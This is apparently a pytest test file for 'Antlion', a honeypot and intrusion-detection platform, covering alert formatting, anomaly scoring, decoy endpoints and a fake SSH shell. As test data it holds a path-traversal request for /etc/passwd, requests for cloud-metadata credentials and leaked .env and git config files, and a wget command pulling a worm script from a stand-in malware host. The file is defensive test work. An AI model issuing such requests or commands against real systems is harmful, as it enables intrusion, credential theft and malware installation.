"""
Tests for Antlion platform refinements: IP Threat Intelligence, Anomaly Detector,
Alert Dispatcher, Live Capture Correlator, Deceptive Canaries, and Web Dashboard.
"""

import tempfile
from pathlib import Path

import pytest
from fastapi.testclient import TestClient

from antlion.alerts.dispatcher import AlertDispatcher
from antlion.capture.flow_extractor import PacketMetadata
from antlion.capture.live import LiveCapturePipeline
from antlion.classification.anomaly import FlowAnomalyDetector
from antlion.core.types import (
    AttackCategory,
    DecoyEvent,
    DecoyServiceType,
    InteractionDepth,
    SeverityLevel,
    Verdict,
)
from antlion.decoys.ssh_telnet.filesystem import FakeFilesystem
from antlion.decoys.web.app import create_web_decoy_app
from antlion.intel.enricher import IPThreatEnricher
from antlion.query.api import create_query_api
from antlion.storage.database import AntlionDatabase
from antlion.verdict.engine import VerdictEngine


def test_ip_threat_enricher():
    enricher = IPThreatEnricher(enable_live_lookup=False)

    # 1. Private / loopback IP
    p_lan = enricher.enrich("192.168.1.10")
    assert p_lan.is_private is True
    assert p_lan.country == "Private Network"
    assert p_lan.risk_score <= 0.20

    # 2. Public IP
    p_pub = enricher.enrich("8.8.8.8")
    assert p_pub.is_private is False
    assert p_pub.risk_score >= 0.40


def test_flow_anomaly_detector():
    with tempfile.TemporaryDirectory() as tmp_dir:
        model_path = Path(tmp_dir) / "anomaly_test.joblib"
        detector = FlowAnomalyDetector(model_path=model_path, contamination=0.10)

        # Baseline flow
        normal_flow = {
            "Flow Duration": 50000.0,
            "Total Fwd Packets": 10.0,
            "Total Backward Packets": 10.0,
            "Flow Bytes/s": 5000.0,
            "Average Packet Size": 500.0,
        }
        is_anom, score = detector.score_flow(normal_flow)
        assert 0.0 <= score <= 1.0

        # Highly abnormal flow (extreme duration and packets)
        extreme_flow = {
            "Flow Duration": 999999999.0,
            "Total Fwd Packets": 999999.0,
            "Total Backward Packets": 0.0,
            "Flow Bytes/s": 99999999.0,
            "Average Packet Size": 99999.0,
        }
        is_anom_ext, score_ext = detector.score_flow(extreme_flow)
        assert 0.0 <= score_ext <= 1.0


def test_alert_dispatcher_cef_formatting():
    dispatcher = AlertDispatcher()

    v = Verdict(
        verdict_id="cef-test-123",
        source_ip="185.220.101.5",
        target_service="SSH",
        attack_type=AttackCategory.COMMAND_INJECTION,
        severity=SeverityLevel.CRITICAL,
        confidence=0.96,
    )

    cef_str = dispatcher.format_cef(v)
    assert "CEF:0|Antlion|Honeypot-IDS|" in cef_str
    assert "src=185.220.101.5" in cef_str
    assert "|10|" in cef_str  # Critical maps to 10
    assert "Command Injection" in cef_str


def test_live_capture_and_correlation_pipeline():
    with tempfile.NamedTemporaryFile(suffix=".db") as tmp_db:
        db = AntlionDatabase(tmp_db.name)
        engine = VerdictEngine(db=db)
        pipeline = LiveCapturePipeline(verdict_engine=engine)

        # Ingest packets for an attacking IP
        pkt = PacketMetadata(
            timestamp=100.0,
            src_ip="203.0.113.88",
            dst_ip="10.0.1.14",
            src_port=44444,
            dst_port=8080,
            protocol=6,
            length=150,
            tcp_flags={"SYN": 1},
        )
        pipeline.ingest_packet(pkt)

        # Correlate incoming decoy event
        event = DecoyEvent(
            source_ip="203.0.113.88",
            source_port=44444,
            target_service=DecoyServiceType.WEB_ADMIN,
            depth=InteractionDepth.WEB_EXPLOIT_PAYLOAD,
            http_path="/config/backup?file=../../../../etc/passwd",
        )

        verdict = pipeline.correlate_and_process_decoy(event)
        assert verdict.source_ip == "203.0.113.88"
        assert verdict.confidence > 0.70
        assert verdict.contributing_signals is not None
        assert verdict.contributing_signals.ml_signal is not None


def test_canary_and_honey_endpoints():
    app = create_web_decoy_app()
    client = TestClient(app)

    # 1. AWS IMDS SSRF trap
    resp_meta = client.get("/latest/meta-data/")
    assert resp_meta.status_code == 200
    assert "iam/" in resp_meta.text

    resp_cred = client.get("/latest/meta-data/iam/security-credentials/InfraOpsRole")
    assert resp_cred.status_code == 200
    assert "ASIA99CANARYHONEYTOKEN1" in resp_cred.json()["AccessKeyId"]

    # 2. Leaked .env trap
    resp_env = client.get("/.env")
    assert resp_env.status_code == 200
    assert "DATABASE_URL" in resp_env.text

    # 3. Leaked git config
    resp_git = client.get("/.git/config")
    assert resp_git.status_code == 200
    assert "git@github.corp.internal" in resp_git.text

    # 4. GraphQL trap
    resp_gql = client.get("/graphql")
    assert resp_gql.status_code == 200
    assert "AdminSecret" in resp_gql.text


def test_ssh_decoy_payload_forensics():
    fs = FakeFilesystem()
    out, code = fs.execute_command("wget http://malware-drop.ru/worm.sh -O /tmp/worm.sh")
    assert code == 0
    assert len(fs.captured_payloads) == 1
    p = fs.captured_payloads[0]
    assert "worm.sh" in p["url"]
    assert len(p["sha256"]) == 64
    assert "/tmp/worm.sh" in fs.files


def test_dashboard_routes():
    with tempfile.NamedTemporaryFile(suffix=".db") as tmp_db:
        db = AntlionDatabase(tmp_db.name)
        app = create_query_api(db=db)
        client = TestClient(app)

        resp_root = client.get("/")
        assert resp_root.status_code == 200
        assert "ANTLION" in resp_root.text
        assert "SOC PIT CONSOLE" in resp_root.text

        resp_dash = client.get("/dashboard")
        assert resp_dash.status_code == 200
        assert "Live Honeypot Pit Intrusion Feed" in resp_dash.text
